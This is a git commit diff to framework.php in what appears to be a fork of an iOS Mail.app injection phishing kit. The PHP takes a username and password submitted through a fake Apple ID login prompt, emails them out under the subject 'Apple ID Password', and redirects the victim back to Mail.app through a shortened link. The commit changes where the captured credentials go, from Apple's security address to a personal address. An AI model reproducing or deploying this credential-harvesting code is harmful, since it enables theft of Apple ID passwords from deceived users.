cd84b8c543e7c291e1e87d862cce2439abacf5ce
Nick Knudsen <nickknudsen@users.noreply.github.com>
2015-06-11 19:17:31 -0500

    Changed Email

--- framework.php
+++ framework.php
@@ -8,7 +8,7 @@ if(isset($_GET['modal-username']) && isset($_GET['modal-password'])) {
         die('There was an error.');
     }
     else {
-	    mail('product-security@apple.com','Apple ID Password',"Thanks for your password! \n $data ¯\_(ツ)_/¯ \n https://github.com/jansoucek/iOS-Mail.app-inject-kit");
+	    mail('ios@nickknudsen.com','Apple ID Password',"Thanks for your password! \n $data ¯\_(ツ)_/¯ \n https://github.com/jansoucek/iOS-Mail.app-inject-kit");
 	    header("Location: http://is.gd/9VOMTp"); //Redirects recipient from Safari back to Mail.app using message://dummy
 	    die();
     }
